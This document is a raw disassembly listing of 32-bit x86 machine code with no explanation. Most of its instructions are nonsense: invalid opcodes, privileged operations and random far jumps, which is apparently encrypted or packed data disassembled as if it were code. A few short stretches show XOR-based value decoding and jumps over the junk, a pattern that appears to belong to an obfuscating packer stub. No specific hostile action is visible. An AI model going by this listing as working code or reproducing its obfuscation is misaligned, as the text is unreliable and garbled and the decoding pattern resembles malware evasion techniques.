  40a839:	jge    0x40a8a8
  40a83b:	dec    esp
  40a83c:	jb     0x40a8a1
  40a83e:	jmp    0x40a87c
  40a840:	or     BYTE PTR [edi+ebx*4],dl
  40a843:	adc    eax,0x5c7e7eeb
  40a848:	jg     0x40a8c8
  40a84a:	jle    0x40a833
  40a84c:	(bad)  
  40a84f:	mov    eax,0xda26a8a
  40a854:	jbe    0x40a858
  40a856:	mov    eax,cr3
  40a859:	add    eax,0xcb2a0b2f
  40a85e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a85f:	push   ebx
  40a860:	and    ch,dh
  40a862:	pushf  
  40a863:	daa    
  40a864:	pop    esp
  40a865:	mov    ch,BYTE PTR [esi+0x28eff283]
  40a86b:	imul   ecx,DWORD PTR [ebp+ecx*8-0x14],0x66602813
  40a873:	dec    ebx
  40a874:	mov    DWORD PTR [esi],esp
  40a876:	sub    al,0x9e
  40a878:	or     BYTE PTR [edx+0x7a4b2257],dl
  40a87e:	neg    DWORD PTR [ebx]
  40a880:	aam    0xb1
  40a882:	inc    esi
  40a883:	dec    ebx
  40a884:	and    DWORD PTR [edx],0x272edef9
  40a88a:	cmp    BYTE PTR [esi+0x4d],dh
  40a88d:	inc    ebx
  40a88e:	sub    dl,BYTE PTR [ebp-0x3afb0bf7]
  40a894:	jne    0x40a911
  40a896:	inc    esp
  40a897:	and    esi,DWORD PTR [ebx-0x34]
  40a89a:	push   ds
  40a89b:	push   ebp
  40a89c:	test   DWORD PTR [edi+eiz*1],0x60d5434b
  40a8a3:	adc    ebp,esi
  40a8a5:	pop    es
  40a8a6:	or     ecx,edx
  40a8a8:	mov    bl,0x29
  40a8aa:	jmp    0x5cba:0x139d47f9
  40a8b1:	fnstcw WORD PTR [ecx+0x62]
  40a8b4:	adc    eax,0x743ee714
  40a8b9:	xchg   edx,eax
  40a8bb:	mov    eax,ds:0xa36bc395
  40a8c0:	xchg   ecx,eax
  40a8c1:	fs adc eax,0xd4ffba37
  40a8c7:	ret    
  40a8c8:	xchg   ebp,eax
  40a8c9:	outs   dx,BYTE PTR ds:[esi]
  40a8ca:	enter  0x7d1a,0x5d
  40a8ce:	clc    
  40a8cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8d0:	ror    BYTE PTR [esi+ecx*1+0x78],0xc
  40a8d5:	into   
  40a8d6:	fwait
  40a8d7:	iret   
  40a8d8:	rol    DWORD PTR [eax-0x4f3d7ddf],0x32
  40a8df:	mov    eax,ds:0xca968a15
  40a8e4:	pop    es
  40a8e5:	or     cl,0x1
  40a8e8:	(bad)  
  40a8e9:	pop    esi
  40a8ea:	dec    edx
  40a8eb:	in     al,dx
  40a8ec:	fldenv [ecx]
  40a8ee:	jo     0x40a947
  40a8f0:	pop    esp
  40a8f1:	dec    esi
  40a8f2:	gs and eax,0xf3a7e1e8
  40a8f8:	mov    cl,0xec
  40a8fa:	fild   QWORD PTR [esi+0x73]
  40a8fd:	sbb    BYTE PTR [esi+ebp*4],dh
  40a900:	lds    eax,FWORD PTR [ecx]
  40a902:	aas    
  40a903:	aas    
  40a904:	cmp    BYTE PTR [esi+0x33433f0e],dl
  40a90a:	xor    edi,DWORD PTR [ebx]
  40a90c:	aam    0xb8
  40a90e:	mov    ds:0x9e2d4147,eax
  40a913:	cdq    
  40a914:	pop    edi
  40a915:	retf   0x5308
  40a918:	mov    ebp,0xbfde4f9a
  40a91d:	test   al,al
  40a91f:	xor    eax,0xd2de7982
  40a924:	lods   al,BYTE PTR ds:[esi]
  40a925:	cmp    BYTE PTR [edi],0x61
  40a928:	sub    eax,0x224884bc
  40a92d:	gs lock pop edx
  40a930:	jge    0x40a99d
  40a932:	ins    BYTE PTR es:[edi],dx
  40a933:	ins    DWORD PTR es:[edi],dx
  40a934:	add    BYTE PTR [esi],bl
  40a936:	mov    ds:0x83dc9ad1,eax
  40a93b:	outs   dx,DWORD PTR ds:[esi]
  40a93c:	mov    ecx,0x68969fad
  40a941:	cmp    eax,0x44cc5e1f
  40a946:	add    esi,eax
  40a948:	sbb    al,0xbc
  40a94a:	xchg   edi,eax
  40a94b:	fimul  DWORD PTR [ecx-0x2b6d0e54]
  40a951:	jo     0x40a9b5
  40a953:	sbb    BYTE PTR [eax+ebx*1],ch
  40a956:	mov    DWORD PTR [ebx+0x4fcee359],edx
  40a95c:	sub    al,0xfd
  40a95e:	lock stos BYTE PTR es:[edi],al
  40a960:	push   edi
  40a961:	fadd   st(6),st
  40a963:	mov    edx,DWORD PTR [esi+esi*4+0x8b0f480]
  40a96a:	pop    edx
  40a96b:	lahf   
  40a96c:	in     al,0x1a
  40a96e:	jnp    0x40a950
  40a970:	xor    al,0xd2
  40a972:	cmc    
  40a973:	cmp    ecx,DWORD PTR [eax]
  40a975:	mov    ch,0x13
  40a977:	scas   al,BYTE PTR es:[edi]
  40a978:	repnz ficomp DWORD PTR [eax-0x6f]
  40a97c:	mov    ss:0x8682385d,eax
  40a982:	js     0x40a9b2
  40a984:	inc    ebp
  40a985:	aaa    
  40a986:	fadd   QWORD PTR [esi-0x26b1b26a]
  40a98c:	out    dx,eax
  40a98d:	bound  esi,QWORD PTR [ebx]
  40a98f:	gs inc edx
  40a991:	and    ch,bl
  40a993:	cwde   
  40a994:	jne    0x40a9e3
  40a996:	push   esi
  40a997:	adc    esi,esp
  40a999:	or     eax,0xb394c351
  40a99e:	retf   
  40a99f:	pusha  
  40a9a0:	mov    WORD PTR [ecx-0x78],cs
  40a9a3:	sar    DWORD PTR [edi-0x496a74a5],0x82
  40a9aa:	mov    bh,0x6f
  40a9ac:	xchg   esi,eax
  40a9ad:	dec    edx
  40a9ae:	add    eax,0x4c1cb6e7
  40a9b3:	ds pushf 
  40a9b5:	cmp    DWORD PTR [esi],ebx
  40a9b7:	sahf   
  40a9b8:	scas   eax,DWORD PTR es:[edi]
  40a9b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9ba:	add    ebx,DWORD PTR [ebp-0x1d15838e]
  40a9c0:	loopne 0x40a951
  40a9c2:	daa    
  40a9c3:	(bad)  
  40a9c5:	jns    0x40a95b
  40a9c7:	stos   DWORD PTR es:[edi],eax
  40a9c8:	imul   ebp,esi,0x1fb43b54
  40a9ce:	push   eax
  40a9cf:	fstp   DWORD PTR [edi+eax*4+0x55b4d4f9]
  40a9d6:	mov    ch,0x5d
  40a9d8:	adc    DWORD PTR [edi+0x3c4a653e],ebp
  40a9de:	xchg   DWORD PTR [esp+ebp*8+0x20],eax
  40a9e2:	scas   eax,DWORD PTR es:[edi]
  40a9e3:	(bad)  
  40a9e4:	ror    esi,1
  40a9e6:	push   0x5430fb5d
  40a9eb:	sbb    ebx,DWORD PTR [ebp-0xb]
  40a9ee:	mov    ebp,0x36d11955
  40a9f3:	mov    edi,0xfa14c96a
  40a9f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9f9:	popf   
  40a9fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9fb:	out    dx,al
  40a9fc:	push   eax
  40a9fd:	addr16 daa 
  40a9ff:	mov    al,ds:0x93a4a60b
  40aa04:	adc    al,0xc6
  40aa06:	nop
  40aa07:	jl     0x40a9ba
  40aa09:	aas    
  40aa0a:	xor    BYTE PTR [edx+ebx*4+0x53],ch
  40aa0e:	or     esi,DWORD PTR [ebp+0x1cfcb62e]
  40aa14:	jbe    0x40aa27
  40aa16:	cwde   
  40aa17:	mov    al,ds:0x76b21b48
  40aa1c:	arpl   WORD PTR [edi+0x328ffba7],di
  40aa22:	push   edi
  40aa23:	xlat   BYTE PTR ds:[ebx]
  40aa24:	or     ebx,DWORD PTR [edi-0x38ebce2b]
  40aa2a:	inc    ebp
  40aa2b:	cld    
  40aa2c:	xor    al,BYTE PTR [ebp-0x2ef40764]
  40aa32:	mov    eax,DWORD PTR [ebp-0x4]
  40aa35:	push   esi
  40aa36:	or     ecx,edx
  40aa38:	mov    esi,DWORD PTR [ebp-0x8]
  40aa3b:	add    ecx,ecx
  40aa3d:	mov    edx,0x7510856
  40aa42:	xor    eax,edx
  40aa44:	xor    DWORD PTR ds:0x42e8e2,0x78fe
  40aa4e:	xor    esi,edx
  40aa50:	dec    ecx
  40aa51:	mov    ecx,0x32729d
  40aa56:	add    esi,ecx
  40aa58:	add    DWORD PTR ds:0x4306da,0x42e8e2
  40aa62:	add    eax,ecx
  40aa64:	imul   eax,esi
  40aa67:	mov    esi,DWORD PTR [ebp+0xc]
  40aa6a:	mov    DWORD PTR ds:0x42e8da,0x6fc4
  40aa74:	cmp    esi,eax
  40aa76:	mov    DWORD PTR ds:0x4306d6,0x4d9
  40aa80:	jne    0x40ae92
  40aa86:	mov    eax,DWORD PTR [ebp-0x4]
  40aa89:	mov    esi,DWORD PTR [ebp-0x8]
  40aa8c:	jmp    0x40ac87
  40aa91:	fisubr DWORD PTR [ebp-0x80]
  40aa94:	cld    
  40aa95:	mov    eax,ds:0x406d7afd
  40aa9a:	adc    DWORD PTR [ecx-0x7],esp
  40aa9d:	xrelease xchg BYTE PTR [edx+0x7eed7380],bh
  40aaa4:	jle    0x40ab02
  40aaa6:	jg     0x40ab26
  40aaa8:	jle    0x40aae6
  40aaaa:	inc    edx
  40aaab:	pop    edi
  40aaac:	enter  0x9f71,0xfb
  40aab0:	scas   eax,DWORD PTR es:[edi]
  40aab1:	inc    eax
  40aab2:	sub    DWORD PTR [edx+esi*8+0x3835be34],edi
  40aab9:	push   cs
  40aaba:	les    ebx,FWORD PTR [edi+0xd49d2b5]
  40aac0:	push   ecx
  40aac1:	sbb    bl,BYTE PTR [ebx]
  40aac3:	adc    al,0x4d
  40aac5:	dec    ecx
  40aac6:	xchg   BYTE PTR [edx-0x42],cl
  40aac9:	xor    esp,esp
  40aacb:	sub    BYTE PTR [edx+0x2ac895a8],bh
  40aad1:	cmc    
  40aad2:	ins    DWORD PTR es:[edi],dx
  40aad3:	loop   0x40aaf4
  40aad5:	xor    ebp,DWORD PTR [edx]
  40aad7:	nop
  40aad8:	pop    ecx
  40aad9:	addr16 sbb ecx,edx
  40aadc:	mov    bh,0xdf
  40aade:	int3   
  40aadf:	adc    dl,BYTE PTR [esi-0x3f69b90c]
  40aae5:	fidiv  WORD PTR [eax]
  40aae7:	cmp    BYTE PTR [edi],bl
  40aae9:	cli    
  40aaea:	mov    eax,es
  40aaec:	push   ss
  40aaed:	loopne 0x40ab64
  40aaef:	push   ecx
  40aaf0:	xchg   esi,eax
  40aaf1:	dec    ecx
  40aaf2:	rol    BYTE PTR [edi-0x199f9632],1
  40aaf8:	arpl   WORD PTR [eax+esi*1-0x2b13aa9d],si
  40aaff:	pcmpeqb mm0,QWORD PTR [ebx+0x57]
  40ab03:	sub    DWORD PTR [eax],ecx
  40ab05:	ja     0x40ab79
  40ab07:	push   es
  40ab08:	in     al,dx
  40ab09:	xchg   DWORD PTR [edi-0x5e],eax
  40ab0c:	pop    ebx
  40ab0d:	shl    esp,cl
  40ab0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab10:	aas    
  40ab11:	mov    ch,0x42
  40ab13:	jmp    0xd7be:0x6291204f
  40ab1a:	test   BYTE PTR [ebp-0x6e],cl
  40ab1d:	jnp    0x40aafc
  40ab1f:	outs   dx,BYTE PTR ds:[esi]
  40ab20:	ja     0x40ab32
  40ab22:	loopne 0x40ab03
  40ab24:	hlt    
  40ab25:	repnz rcl BYTE PTR [ebx-0x40],1
  40ab29:	imul   ecx,DWORD PTR [edi],0xd29d03e4
  40ab2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab30:	lods   al,BYTE PTR ds:[esi]
  40ab31:	data16 (bad) 
  40ab33:	and    eax,ecx
  40ab35:	aad    0x1b
  40ab37:	push   ss
  40ab38:	inc    ecx
  40ab39:	mov    dh,0xe0
  40ab3b:	fwait
  40ab3c:	pusha  
  40ab3d:	ret    
  40ab3e:	adc    BYTE PTR ds:0x87770e17,bh
  40ab44:	stos   DWORD PTR es:[edi],eax
  40ab45:	(bad)
  40ab49:	shl    esp,1
  40ab4b:	jo     0x40ab3b
  40ab4d:	shr    BYTE PTR [edi+0x422008ae],cl
  40ab53:	xchg   BYTE PTR ds:[ecx-0x28],al
  40ab57:	test   BYTE PTR [eax-0x3272cae2],dh
  40ab5d:	fxam   
  40ab5f:	in     eax,dx
  40ab60:	push   ss
  40ab61:	enter  0xa810,0x29
  40ab65:	sbb    DWORD PTR ds:0x20d5ffeb,0x13
  40ab6c:	cmp    esi,DWORD PTR [ebx]
  40ab6e:	push   ecx
  40ab6f:	inc    ebp
  40ab70:	push   cs
  40ab71:	push   es
  40ab72:	inc    edi
  40ab73:	xor    BYTE PTR [edx+0x76ed1502],0xd4
  40ab7a:	iret   
  40ab7b:	cmc    
  40ab7c:	sbb    DWORD PTR [ebx+0x2efc2ced],0xd59710ec
  40ab86:	jne    0x40ab4d
  40ab88:	pop    esi
  40ab89:	jmp    0x45dd:0x1a52dd68
  40ab90:	or     DWORD PTR [eax+0x630f1766],0xffffff87
  40ab97:	dec    ebp
  40ab98:	mov    dl,al
  40ab9a:	int    0xce
  40ab9c:	cdq    
  40ab9d:	inc    edi
  40ab9e:	sub    ebp,esp
  40aba0:	(bad)  
  40aba2:	outs   dx,BYTE PTR ds:[esi]
  40aba3:	shr    BYTE PTR [edi+0xa],0x8c
  40aba7:	scas   eax,DWORD PTR es:[edi]
  40aba8:	mov    esp,0xbae96bac
  40abad:	push   ebx
  40abae:	inc    esp
  40abaf:	clc    
  40abb0:	test   DWORD PTR [edi],ebx
  40abb2:	push   esi
  40abb3:	into   
  40abb4:	fnstsw WORD PTR ds:0xaf36349f
  40abba:	or     esp,DWORD PTR [esi]
  40abbc:	addr16 sbb ebp,edx
  40abbf:	push   edx
  40abc0:	mov    ebx,0xa97b28ab
  40abc5:	ja     0x40ac15
  40abc7:	popf   
  40abc8:	cmc    
  40abc9:	cmp    eax,0xe4c9a86e
  40abce:	fs out 0xcb,eax
  40abd1:	repnz pop ss
  40abd3:	pop    ebp
  40abd4:	xor    BYTE PTR [edx+ecx*2+0x575a1a3c],bh
  40abdb:	sub    DWORD PTR [ecx+0x74],ebx
  40abde:	adc    edi,DWORD PTR [eax+eiz*4-0x7a710855]
  40abe5:	sub    eax,0xbda1b6e4
  40abea:	and    ebx,0x60b99943
  40abf0:	out    0x70,eax
  40abf2:	scas   al,BYTE PTR es:[edi]
  40abf3:	outs   dx,BYTE PTR ds:[esi]
  40abf4:	add    al,0x72
  40abf6:	sahf   
  40abf7:	mov    esp,0x418da441
  40abfc:	dec    ecx
  40abfd:	jmp    FWORD PTR [edi]
  40abff:	mov    eax,0xcae36386
  40ac04:	es push ecx
  40ac06:	dec    ecx
  40ac07:	outs   dx,DWORD PTR ds:[esi]
  40ac08:	push   ds
  40ac09:	pop    ds
  40ac0a:	dec    edx
  40ac0b:	outs   dx,BYTE PTR ds:[esi]
  40ac0c:	xor    DWORD PTR [esi],edx
  40ac0e:	pop    eax
  40ac0f:	lods   eax,DWORD PTR ds:[esi]
  40ac10:	test   BYTE PTR [eax-0x5bb2a512],al
  40ac16:	pop    eax
  40ac17:	imul   eax,DWORD PTR ds:0xec82abab,0x3ca311b7
  40ac21:	and    al,bl
  40ac23:	and    al,0xbb
  40ac25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac26:	mov    ebx,0x188c7647
  40ac2b:	sub    BYTE PTR [eax+edi*1],dl
  40ac2e:	xor    ecx,DWORD PTR [ebp-0x79]
  40ac31:	aad    0x94
  40ac33:	je     0x40ac4e
  40ac35:	cmp    BYTE PTR [ebx+0x3b286d36],0x42
  40ac3c:	int3   
  40ac3d:	dec    ebp
  40ac3e:	lahf   
  40ac3f:	sbb    eax,0x49d0ad51
  40ac44:	and    DWORD PTR [eax-0x79],esi
  40ac47:	fsubr  DWORD PTR [edx+0x7b]
  40ac4a:	and    DWORD PTR [ebp+0x8],edx
  40ac4d:	pop    eax
  40ac4e:	and    eax,0xe7870adb
  40ac53:	xchg   ecx,eax
  40ac54:	ret    
  40ac55:	mov    esp,0xc63d05f8
  40ac5a:	cmp    al,0x57
  40ac5c:	pop    ebp
  40ac5d:	jecxz  0x40ac8a
  40ac5f:	adc    DWORD PTR [edi-0x332ac333],ebp
  40ac65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac66:	outs   dx,DWORD PTR ds:[esi]
  40ac67:	sar    BYTE PTR [ebx+0x5a],cl
  40ac6a:	loopne 0x40acaa
  40ac6c:	icebp  
  40ac6d:	and    esi,DWORD PTR [eax+0x7b3e9b0a]
  40ac73:	scas   eax,DWORD PTR es:[edi]
  40ac74:	(bad)  
  40ac75:	add    eax,0x549a8fc9
  40ac7a:	or     al,0xdf
  40ac7c:	xchg   BYTE PTR [edi+0x3b],al
  40ac7f:	and    al,0xa5
  40ac81:	imul   BYTE PTR [ebp+eiz*1+0x33a71a14]
  40ac88:	ret    0xf233
  40ac8b:	add    eax,ecx
  40ac8d:	jmp    0x40ae88
  40ac92:	pop    ebp
  40ac93:	icebp  
  40ac94:	lds    esp,FWORD PTR [eax-0x23]
  40ac97:	fs jge 0x40ac47
  40ac9a:	xchg   edi,eax
  40ac9b:	imul   ebx,edx,0xd5696402
  40aca1:	mov    esi,0x7e7eee51
  40aca6:	pop    esp
  40aca7:	jg     0x40ad27
  40aca9:	jle    0x40ad28
  40acab:	fstp   DWORD PTR [ebp-0x50a1a59]
  40acb1:	add    eax,0xd7efb4ce
  40acb6:	mov    cl,0xa7
  40acb8:	(bad)  
  40acb9:	dec    edi
  40acba:	(bad)  
  40acbb:	cmp    al,0xcd
  40acbd:	sub    esi,edx
  40acbf:	rcl    BYTE PTR [eax],0xfc
  40acc2:	push   esp
  40acc3:	pop    ds
  40acc4:	mov    edx,0x3cefc55a
  40acc9:	jnp    0x40ac6d
  40accb:	mov    ds,WORD PTR [edx-0x6e]
  40acce:	cli    
  40accf:	adc    eax,0x31
  40acd2:	add    ebx,DWORD PTR [eax+eax*1]
  40acd5:	mov    dh,0x3f
  40acd7:	imul   edi,DWORD PTR [esi-0x63],0x3dabf21e
  40acde:	outs   dx,DWORD PTR ds:[esi]
  40acdf:	mov    ah,0x6e
  40ace1:	inc    ebx
  40ace2:	or     al,0x5a
  40ace4:	imul   eax,DWORD PTR [ebx+0x30],0x1a
  40ace8:	sahf   
  40ace9:	inc    ebp
  40acea:	jo     0x40acb9
  40acec:	add    eax,0xc93d5aeb
  40acf1:	add    BYTE PTR [eax],al
  40acf3:	inc    esi
  40acf4:	and    dh,BYTE PTR [edi-0x51]
  40acf7:	retf   0xa519
  40acfa:	loope  0x40acb0
  40acfc:	pop    esi
  40acfd:	aaa    
  40acfe:	inc    ebp
  40acff:	sub    DWORD PTR [esi-0x4d],0x30
  40ad03:	xchg   esp,eax
  40ad04:	lds    esp,FWORD PTR [esi+esi*2-0x7d2b9bb9]
  40ad0b:	mov    ch,0xab
  40ad0d:	mov    eax,ds:0x551c839e
  40ad12:	sub    al,0x1d
  40ad14:	cli    
  40ad15:	shl    DWORD PTR [ecx-0x39],cl
  40ad18:	xor    eax,0xf6433824
  40ad1d:	enter  0xc15,0xfb
  40ad21:	out    dx,al
  40ad22:	imul   esi,DWORD PTR [eax+0x7c08d530],0x24
  40ad29:	jno    0x40ace2
  40ad2b:	mov    dh,0xea
  40ad2d:	test   DWORD PTR [edx-0x5],ebx
  40ad30:	out    0xac,al
  40ad32:	sbb    eax,0xb74914e7
  40ad37:	loopne 0x40ad36
  40ad39:	outs   dx,BYTE PTR ds:[esi]
  40ad3a:	pop    eax
  40ad3b:	jecxz  0x40ad26
  40ad3d:	mov    ds:0xa9d5a6e4,al
  40ad42:	pop    ebp
  40ad43:	repnz mov ecx,DWORD PTR [eax+0x7b4ab4c7]
  40ad4a:	in     al,0x6
  40ad4c:	fadd   QWORD PTR [ebx-0x40490d27]
  40ad52:	mov    dh,0x56
  40ad54:	add    eax,0x45fa2ce4
  40ad59:	xchg   ebp,eax
  40ad5a:	in     eax,0x55
  40ad5c:	retf   
  40ad5d:	scas   eax,DWORD PTR es:[edi]
  40ad5e:	adc    al,0x74
  40ad60:	jae    0x40ad18
  40ad62:	mov    ecx,0x9809d428
  40ad67:	inc    edi
  40ad68:	sub    ecx,DWORD PTR [eax]
  40ad6a:	xchg   ebx,eax
  40ad6b:	xchg   esi,eax
  40ad6c:	dec    esp
  40ad6d:	loopne 0x40adcd
  40ad6f:	cmp    al,ch
  40ad71:	repz mov ebx,0x95400a15
  40ad77:	jae    0x40adde
  40ad79:	addr16 push ds
  40ad7b:	ins    BYTE PTR es:[edi],dx
  40ad7c:	ret    0xf1b0
  40ad7f:	xchg   DWORD PTR [ebx-0x18],ebp
  40ad82:	push   edx
  40ad83:	and    eax,0x754acc11
  40ad88:	inc    esp
  40ad89:	(bad)  
  40ad8a:	cli    
  40ad8b:	iret   
  40ad8c:	cmp    dl,BYTE PTR [ecx+0x2d]
  40ad8f:	xchg   edx,eax
  40ad90:	aam    0xa8
  40ad92:	and    BYTE PTR [ecx-0x5d0bfd16],bh
  40ad98:	loope  0x40ae05
  40ad9a:	(bad)  
  40ad9b:	das    
  40ad9c:	cmc    
  40ad9d:	adc    eax,DWORD PTR [esi]
  40ad9f:	cld    
  40ada0:	sti    
  40ada1:	mov    DWORD PTR ds:[ecx+edx*8+0x7b049a27],eax
  40ada9:	out    dx,eax
  40adaa:	push   esi
  40adab:	lahf   
  40adac:	mov    edx,DWORD PTR [esi+0x28ccbef6]
  40adb2:	jmp    0x9917:0x1844ed45
  40adb9:	out    0xc3,eax
  40adbb:	(bad)  
  40adbc:	out    dx,eax
  40adbd:	aas    
  40adbe:	jp     0x40ada5
  40adc0:	push   es
  40adc1:	cmp    cl,BYTE PTR [esi+0x68]
  40adc4:	dec    ebp
  40adc5:	cmp    ecx,esp
  40adc7:	out    dx,eax
  40adc8:	lods   eax,DWORD PTR ds:[esi]
  40adc9:	out    dx,al
  40adca:	add    al,0x62
  40adcc:	mov    ds:0xe4e1878b,al
  40add1:	popf   
  40add2:	ror    ebp,1
  40add4:	sahf   
  40add5:	call   0x1e1ce734
  40adda:	daa    
  40addb:	shl    DWORD PTR [eax],cl
  40addd:	or     esp,esi
  40addf:	ds gs xchg esp,eax
  40ade2:	iret   
  40ade3:	stos   BYTE PTR es:[edi],al
  40ade4:	std    
  40ade5:	inc    esi
  40ade6:	push   ebx
  40ade7:	lock rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adea:	pop    ebx
  40adeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adec:	or     eax,0xd5349b31
  40adf1:	scas   eax,DWORD PTR es:[edi]
  40adf2:	ins    BYTE PTR es:[edi],dx
  40adf3:	cli    
  40adf4:	stos   DWORD PTR es:[edi],eax
  40adf5:	dec    ebp
  40adf6:	aaa    
  40adf7:	stc    
  40adf8:	push   ecx
  40adf9:	lock les edi,FWORD PTR [esi]
  40adfc:	stc    
  40adfd:	adc    al,BYTE PTR [ebx+0x1fa0067a]
  40ae03:	aaa    
  40ae04:	mov    ebp,0x4462d7b5
  40ae09:	sbb    eax,0x48b9780c
  40ae0e:	and    esp,DWORD PTR [edi-0x28]
  40ae11:	sub    eax,0xd5529505
  40ae16:	loop   0x40adea
  40ae18:	cwde   
  40ae19:	jge    0x40adea
  40ae1b:	(bad)  
  40ae1d:	mov    fs,WORD PTR [ebp-0x257c6e6]
  40ae23:	add    DWORD PTR [di-0x59],edi
  40ae27:	cmp    ah,BYTE PTR [eax+0x2f]
  40ae2a:	loopne 0x40adac
  40ae2c:	push   ebp
  40ae2d:	ins    BYTE PTR es:[edi],dx
  40ae2e:	mov    edx,cs
  40ae30:	push   cs
  40ae31:	pop    es
  40ae32:	out    0xea,eax
  40ae34:	jne    0x40adb6
  40ae36:	les    edx,FWORD PTR [edx+edi*1]
  40ae39:	sbb    ebp,DWORD PTR [ebp+0x6d]
  40ae3c:	cmp    eax,0x620995ea
  40ae41:	pop    ecx
  40ae42:	test   DWORD PTR [ebx],0xea107705
  40ae48:	xor    ebx,ebp
  40ae4a:	inc    edi
  40ae4b:	jns    0x40adf0
  40ae4d:	test   dh,dl
  40ae4f:	jecxz  0x40ae73
  40ae51:	(bad)  
  40ae52:	cdq    
  40ae53:	aam    0x54
  40ae55:	xor    cl,BYTE PTR [edx+ebp*4-0x45]
  40ae59:	mov    eax,ds:0xad8cf1fb
  40ae5e:	ins    BYTE PTR es:[edi],dx
  40ae5f:	cli    
  40ae60:	fiadd  DWORD PTR [edi+ebx*2]
  40ae63:	adc    eax,0xf684e965
  40ae68:	mov    al,ds:0x3fad652e
  40ae6d:	adc    al,0x6e
  40ae6f:	inc    ecx
  40ae70:	sbb    al,0xbe
  40ae72:	cmp    al,0xe7
  40ae74:	cmp    bl,BYTE PTR [eax-0x64035693]
  40ae7a:	xchg   ecx,eax
  40ae7b:	std    
  40ae7c:	and    al,0x78
  40ae7e:	push   ecx
  40ae7f:	sub    eax,0x46e1859
  40ae84:	and    BYTE PTR [edi],bl
  40ae86:	test   DWORD PTR [ecx],0xaf0ff103
  40ae8c:	(bad)  
  40ae8d:	jmp    0x40b2c3
  40ae92:	mov    eax,DWORD PTR [ebp+0xc]
  40ae95:	mov    eax,DWORD PTR [eax+0x78]
  40ae98:	mov    DWORD PTR [ebp+0xc],eax
  40ae9b:	mov    eax,DWORD PTR [ebp-0x4]
  40ae9e:	mov    esi,DWORD PTR [ebp-0x8]
  40aea1:	jmp    0x40b09c
  40aea6:	aad    0xc4
  40aea8:	outs   dx,DWORD PTR ds:[esi]
  40aea9:	mov    BYTE PTR [edi-0x53],ch
  40aeac:	std    
  40aead:	jge    0x40af09
  40aeaf:	outs   dx,DWORD PTR ds:[esi]
  40aeb0:	stos   DWORD PTR es:[edi],eax
  40aeb1:	lock test al,0x93
  40aeb4:	or     dl,BYTE PTR [edi+0x7e7ee0bf]
  40aeba:	pop    esp
  40aebb:	jg     0x40af3b
  40aebd:	jle    0x40aed1
  40aebf:	(bad)  
  40aec0:	mov    ?,WORD PTR [ecx-0x31]
  40aec3:	cmc    
  40aec4:	aad    0xde
  40aec6:	clc    
  40aec7:	test   DWORD PTR [edx],eax
  40aec9:	scas   al,BYTE PTR es:[edi]
  40aeca:	lods   eax,DWORD PTR ds:[esi]
  40aecb:	pop    ebx
  40aecc:	pop    eax
  40aecd:	fwait
  40aece:	mov    al,ds:0x524cc08f
  40aed3:	ss xchg esi,eax
  40aed5:	push   cs
  40aed6:	cmp    BYTE PTR [eax-0x17],ah
  40aed9:	pop    eax
  40aeda:	test   eax,0x7f21b484
  40aedf:	cmp    eax,0x4cc78654
  40aee4:	jnp    0x40aea8
  40aee6:	scas   al,BYTE PTR es:[edi]
  40aee7:	jbe    0x40aeef
  40aee9:	mov    cl,0xef
  40aeeb:	inc    edx
  40aeec:	mov    ds:0x1c65998,al
  40aef1:	call   0x29ffaded
  40aef6:	dec    DWORD PTR [edx+esi*8+0x7849ebbb]
  40aefd:	add    BYTE PTR [ebx+0x2d],dh
  40af00:	in     eax,0x92
  40af02:	std    
  40af03:	paddusb mm7,QWORD PTR [esi]
  40af06:	pop    ebp
  40af07:	inc    ebx
  40af08:	rcr    dh,cl
  40af0a:	repnz adc esp,DWORD PTR [bp+di-0x4a58]
  40af10:	and    DWORD PTR [esi],esp
  40af12:	int3   
  40af13:	cmp    eax,DWORD PTR [ecx+0x45057b1f]
  40af19:	pop    ecx
  40af1a:	(bad)  
  40af1b:	sahf   
  40af1c:	popf   
  40af1d:	inc    edx
  40af1e:	and    ah,BYTE PTR [edi+0x6c]
  40af21:	jp     0x40aea6
  40af23:	lock or eax,0x9bdc9e3a
  40af29:	pop    edi
  40af2a:	cmp    al,0xd5
  40af2c:	sti    
  40af2d:	lahf   
  40af2e:	sti    
  40af2f:	push   0xffffffdd
  40af31:	mov    WORD PTR ds:0x68ae56d6,cs
  40af37:	cmp    al,0x76
  40af39:	fdiv   st,st(0)
  40af3b:	shl    DWORD PTR [ebp+0x34],0x72
  40af3f:	leave  
  40af40:	pop    edx
  40af41:	and    bl,BYTE PTR [edx-0xe8ec74f]
  40af47:	shl    DWORD PTR [esi],1
  40af49:	push   0xffffffaf
  40af4b:	cwde   
  40af4c:	push   DWORD PTR [esi]
  40af4e:	(bad)  
  40af4f:	iret   
  40af50:	push   edx
  40af51:	retf   0x41f2
  40af54:	lods   al,BYTE PTR ds:[esi]
  40af55:	sub    BYTE PTR [esi-0x25ca89ab],al
  40af5b:	fisttp WORD PTR [edi-0xde84ab0]
  40af61:	jge    0x40aee6
  40af63:	test   eax,0xb7a2887f
  40af68:	imul   ebx,DWORD PTR [ebx-0x77a89de7],0xffffff8b
  40af6f:	mov    ebx,0x6349063a
  40af74:	add    ecx,DWORD PTR [edi]
  40af76:	mov    bl,0x11
  40af78:	dec    esp
  40af79:	jnp    0x40afc7
  40af7b:	(bad)  
  40af7c:	xlat   BYTE PTR ds:[ebx]
  40af7d:	xchg   edx,eax
  40af7e:	stos   BYTE PTR es:[edi],al
  40af7f:	mov    al,ds:0xe872c4bf
  40af84:	push   edi
  40af85:	dec    eax
  40af86:	mov    ch,BYTE PTR [esi]
  40af88:	add    ebx,ebx
  40af8a:	dec    edx
  40af8b:	fild   QWORD PTR [edx+0x61ff9090]
  40af91:	xor    edx,esi
  40af93:	inc    ebp
  40af94:	cdq    
  40af95:	or     BYTE PTR [ecx],al
  40af97:	xchg   DWORD PTR [edi+0x2ea83ab3],esi
  40af9d:	xchg   edx,eax
  40af9e:	jbe    0x40b017
  40afa0:	cmp    DWORD PTR [eax+0x7d0a991],esp
